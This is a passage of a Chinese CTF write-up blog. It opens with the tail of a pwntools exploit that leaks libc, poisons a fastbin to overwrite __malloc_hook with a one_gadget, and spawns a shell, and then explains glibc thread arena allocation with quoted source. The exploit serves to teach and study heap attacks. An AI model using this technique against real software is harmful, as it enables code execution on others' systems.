class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vote</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'index'</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x3e0</span>,<span class="string">'p4nda'</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">555</span>,<span class="string">'p4nda'</span>) <span class="comment">#1</span></span><br><span class="line">cancel(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">'count: '</span>)</span><br><span class="line">leak = int(p.recvline()[:<span class="number">-1</span>])</span><br><span class="line">libc.address = leak - <span class="number">88</span> - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>, hex(leak)</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system :'</span>,hex(libc.symbols[<span class="string">'system'</span>])</span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0x71</span>)+p64(<span class="number">0x71</span>)+p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>) )<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#3</span></span><br><span class="line"><span class="comment">#add(555,'p4nda') #4</span></span><br><span class="line">cancel(<span class="number">2</span>)</span><br><span class="line">cancel(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>):</span><br><span class="line">vote(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4nda'</span> )<span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'p4n'</span>+p64(libc.address + <span class="number">0xf0274</span>))<span class="comment">#0xf02a4))#6</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Action:'</span>)</span><br><span class="line">p.sendline(<span class="string">'0'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x50</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">0x45216execve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4526aexecve("/bin/sh", rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf0274execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1117execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h1 id="null"><a href="#null" class="headerlink" title="null"></a>null</h1><p>涉及到线程堆块的分配，看了两天源代码，尽管出题人说是 <strong>a relatively easy task </strong>。 </p><p>还是记录一下线程堆块分配的姿势。</p><h1 id="线程堆块分配"><a href="#线程堆块分配" class="headerlink" title="线程堆块分配"></a>线程堆块分配</h1><h3 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h3><p><strong>分配区</strong> 个人理解分配区是分配内存必要的分配结构，分为主分配区和非主分配区，主分配区利用sbrk等函数分配，地址是连续的；非主分配区是不连续的，因此需要组织多个子堆块（sub-heap），对应到下面的数据结构，每一个分配区对应一个malloc_state，每一个子堆块对应一个_heap_info。分配区的数量是一定的，与操作系统位数和CPU核数有关</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores + 1.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores + 1.</span><br></pre></td></tr></table></figure><p><strong>锁</strong> 锁是一个普通的变量，需要使用特殊的函数加锁解锁，为了进程间进行同步，防止发生竞争条件。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol><li><p>_heap_info</p><p><strong>仅存在于线程堆块里</strong>的数据结构，主要是标记当前sub_heap的数据信息，在线程里可以存在多个。</p><p><strong>主要原因是</strong> ：一个程序（进程）中可以包含多个进程，而各个进程的地址空间是共享的，主要就造成了其地址冲突。当主线程要求使用sbrk函数来保证堆空间是连续的时，那子线程智能使用mmap来分配堆空间。这样一来，由于mmap分配的特点，导致了线程分配的堆块是以块为单位的，如果某线程需要的堆块多的话，进程空间是不足的，再次使用mmap来分配heap时，二者并不连续，所以需要这样的数据结构来标识该块的所属和一些内存信息。</p><p>该sub_heap数据结构是单链表形式保存的，其_heap_info保存了前一个sub_heap的位置。 </p></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  mstate ar_ptr; <span class="comment">/* Arena for this heap. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">heap_info</span> *<span class="title">prev</span>;</span> <span class="comment">/* Previous heap. */</span></span><br><span class="line">  <span class="keyword">size_t</span> size;   <span class="comment">/* Current size in bytes. */</span></span><br><span class="line">  <span class="keyword">size_t</span> mprotect_size; <span class="comment">/* Size in bytes that has been mprotected</span></span><br><span class="line"><span class="comment">                           PROT_READ|PROT_WRITE.  */</span></span><br><span class="line">  <span class="comment">/* Make sure the following data is properly aligned, particularly</span></span><br><span class="line"><span class="comment">     that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of</span></span><br><span class="line"><span class="comment">     MALLOC_ALIGNMENT. */</span></span><br><span class="line">  <span class="keyword">char</span> pad[<span class="number">-6</span> * SIZE_SZ &amp; MALLOC_ALIGN_MASK];</span><br><span class="line">&#125; heap_info;</span><br></pre></td></tr></table></figure><ol><li><p>malloc_state</p><p>对于进程堆有一些了解的同学对这个数据结构会很熟悉，一个非常常见的结构体是保存在libc库bss段的main_arena，这是主线程堆是唯一的，所以为了方便，在libc中加入了一个全局变量，而这个数据结构的目的是为了组织堆空间，如fastbin、unsorted bin、top链表的组织等等。</p><p>每一个线程有<strong>唯一</strong> 的malloc_state数据结构，即thread arena。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="keyword">mutex_t</span> mutex;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="keyword">int</span> flags;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr top;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr last_remainder;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[BINMAPSIZE];</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Linked list for free arenas.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">  INTERNAL_SIZE_T system_mem;</span><br><span class="line">  INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="结构组织"><a href="#结构组织" class="headerlink" title="结构组织"></a>结构组织</h3><ol><li><p><strong>分配区的获取</strong></p><p>可以先从malloc的代码出发，一步一步寻找分配区的生成与线程获取。首先是__libc_malloc函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">__libc_malloc (<span class="keyword">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="keyword">void</span> *victim;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> *(*hook) (<span class="keyword">size_t</span>, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line"></span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="comment">/* Retry with another arena only if we were able to find a usable arena</span></span><br><span class="line"><span class="comment">     before.  */</span></span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      LIBC_PROBE (memory_malloc_retry, <span class="number">1</span>, bytes);</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class="line">          ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_malloc)</span><br></pre></td></tr></table></figure><p>malloc函数可以大致分为四部分，首先是__malloc_hook函数的检测与执行；接下来是arena_get，也就是分配区的获取；然后是_int_malloc，这个是堆块分配的主要逻辑，也是我们比较熟悉的如fastbin、unsorted bin的组织流程，它的返回值就是拟分配的堆块；最后是对拟分配堆块的一些检测。</p><p>跟踪一下arena_get函数，这是一个宏定义函数，其中，thread_arena变量是线程的全局变量，标志着最近使用过的分配区结构</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_get(ptr, size) do &#123; \</span></span><br><span class="line">      ptr = thread_arena;      \</span><br><span class="line">      arena_lock (ptr, size);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>继续跟踪arena_lock函数，这也是一个宏定义函数。首先，当线程曾经拥有过分配区，会尝试对该分配区加速并使用，否则执行arena_get2函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> arena_lock(ptr, size) do &#123;      \</span></span><br><span class="line">      <span class="keyword">if</span> (ptr &amp;&amp; !arena_is_corrupt (ptr))      \</span><br><span class="line">        (<span class="keyword">void</span>) mutex_lock (&amp;ptr-&gt;mutex);      \</span><br><span class="line">      <span class="keyword">else</span>      \</span><br><span class="line">        ptr = arena_get2 ((size), <span class="literal">NULL</span>);      \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>由于我们要寻找该分配区的初始化，所以继续跟踪arena_get2：</p><p>首先，arena_get2函数调用了get_free_list()函数，猜测应该返回一个空或者一个分配区，如果成功返回了一个分配区，就直接结束；当未找到可用的分配区，就进入下面的逻辑：首先查看narenas_limit变量，应该是对于分配区个数的限制，当未初始化时，会根据内核数量及mp_areana_max进行计算。</p><p>narenas是当前分配区的个数，当不超过分配区个数时，会调用_int_new_arena生成新的分配区，否则调用reused_arena来等待服用分配区。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">arena_get2 (<span class="keyword">size_t</span> size, mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate a;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> <span class="keyword">size_t</span> narenas_limit;</span><br><span class="line"></span><br><span class="line">  a = get_free_list ();</span><br><span class="line">  <span class="keyword">if</span> (a == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Nothing immediately available, so generate a new arena.  */</span></span><br><span class="line">      <span class="keyword">if</span> (narenas_limit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (mp_.arena_max != <span class="number">0</span>)</span><br><span class="line">            narenas_limit = mp_.arena_max;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span> (narenas &gt; mp_.arena_test)</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">int</span> n = __get_nprocs ();</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (n &gt;= <span class="number">1</span>)</span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (n);</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                <span class="comment">/* We have no information about the system.  Assume two</span></span><br><span class="line"><span class="comment">                   cores.  */</span></span><br><span class="line">                narenas_limit = NARENAS_FROM_NCORES (<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    repeat:;</span><br><span class="line">      <span class="keyword">size_t</span> n = narenas;</span><br><span class="line">      <span class="comment">/* NB: the following depends on the fact that (size_t)0 - 1 is a</span></span><br><span class="line"><span class="comment">         very large number and that the underflow is OK.  If arena_max</span></span><br><span class="line"><span class="comment">         is set the value of arena_test is irrelevant.  If arena_test</span></span><br><span class="line"><span class="comment">         is set but narenas is not yet larger or equal to arena_test</span></span><br><span class="line"><span class="comment">         narenas_limit is 0.  There is no possibility for narenas to</span></span><br><span class="line"><span class="comment">         be too big for the test to always fail since there is not</span></span><br><span class="line"><span class="comment">         enough address space to create that many arenas.  */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (n &lt;= narenas_limit - <span class="number">1</span>))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (catomic_compare_and_exchange_bool_acq (&amp;narenas, n + <span class="number">1</span>, n))</span><br><span class="line">            <span class="keyword">goto</span> repeat;</span><br><span class="line">          a = _int_new_arena (size);</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (a == <span class="literal">NULL</span>))</span><br><span class="line">            catomic_decrement (&amp;narenas);</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        a = reused_arena (avoid_arena);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先跟踪get_free_list函数，free_list也是一个全局变量，用于标识下一个可用的分配区，逻辑十分简单，当获取到的free_list不为空，就替换了当前线程保存的分配区，并对该分配区加锁，否则返回NULL。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">get_free_list (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  mstate replaced_arena = thread_arena;</span><br><span class="line">  mstate result = free_list;</span><br><span class="line">  <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">      result = free_list;</span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  free_list = result-&gt;next_free;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The arena will be attached to this thread.  */</span></span><br><span class="line">  ++result-&gt;attached_threads;</span><br><span class="line"></span><br><span class="line">  detach_arena (replaced_arena);</span><br><span class="line">&#125;</span><br><span class="line">      (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (result != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          LIBC_PROBE (memory_arena_reuse_free_list, <span class="number">1</span>, result);</span><br><span class="line">          (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line">  thread_arena = result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟踪reused_arena，可以看到，程序维护了一个全局变量next_to_use，该变量初始值是&amp;main_arena，当成功获取了一个分配区后，这个变量会指向下一个分配区，也就是说分配区的使用是平均和循环的，这也避免了一个分配区被重复使用多次。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> mstate</span><br><span class="line">reused_arena (mstate avoid_arena)</span><br><span class="line">&#123;</span><br><span class="line">  mstate result;</span><br><span class="line">  <span class="comment">/* <span class="doctag">FIXME:</span> Access to next_to_use suffers from data races.  */</span></span><br><span class="line">  <span class="keyword">static</span> mstate next_to_use;</span><br><span class="line">  <span class="keyword">if</span> (next_to_use == <span class="literal">NULL</span>)</span><br><span class="line">    next_to_use = &amp;main_arena;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Iterate over all arenas (including those linked from</span></span><br><span class="line"><span class="comment">     free_list).  */</span></span><br><span class="line">  result = next_to_use;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (!arena_is_corrupt (result) &amp;&amp; !mutex_trylock (&amp;result-&gt;mutex))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* <span class="doctag">FIXME:</span> This is a data race, see _int_new_arena.  */</span></span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">while</span> (result != next_to_use);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Avoid AVOID_ARENA as we have already failed to allocate memory</span></span><br><span class="line"><span class="comment">     in that arena and it is currently locked.   */</span></span><br><span class="line">  <span class="keyword">if</span> (result == avoid_arena)</span><br><span class="line">    result = result-&gt;next;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the arena we get is not corrupted.  */</span></span><br><span class="line">  mstate begin = result;</span><br><span class="line">  <span class="keyword">while</span> (arena_is_corrupt (result) || result == avoid_arena)</span><br><span class="line">    &#123;</span><br><span class="line">      result = result-&gt;next;</span><br><span class="line">      <span class="keyword">if</span> (result == begin)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We could not find any arena that was either not corrupted or not the one</span></span><br><span class="line"><span class="comment">     we wanted to avoid.  */</span></span><br><span class="line">  <span class="keyword">if</span> (result == begin || result == avoid_arena)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* No arena available without contention.  Wait for the next in line.  */</span></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse_wait, <span class="number">3</span>, &amp;result-&gt;mutex, result, avoid_arena);</span><br><span class="line">  (<span class="keyword">void</span>) mutex_lock (&amp;result-&gt;mutex);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">  <span class="comment">/* Attach the arena to the current thread.  Note that we may have</span></span><br><span class="line"><span class="comment">     selected an arena which was on free_list.  */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Update the arena thread attachment counters.   */</span></span><br><span class="line">    mstate replaced_arena = thread_arena;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_lock (&amp;free_list_lock);</span><br><span class="line">    detach_arena (replaced_arena);</span><br><span class="line">    ++result-&gt;attached_threads;</span><br><span class="line">    (<span class="keyword">void</span>) mutex_unlock (&amp;free_list_lock);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  LIBC_PROBE (memory_arena_reuse, <span class="number">2</span>, result, avoid_arena);</span><br><span class="line">  thread_arena = result;</span><br><span class="line">  next_to_use = result-&gt;next;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后，分析一下一个新分配区的生成函数_int_new_arena。首先调用了new_heap函数来申请新的内存，可以看到，当获得内存后，该内存的第一块是heap_info结构，接下来设置了malloc_state结构和top头。</p><p>至此，一个新的分配区生成完毕。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td 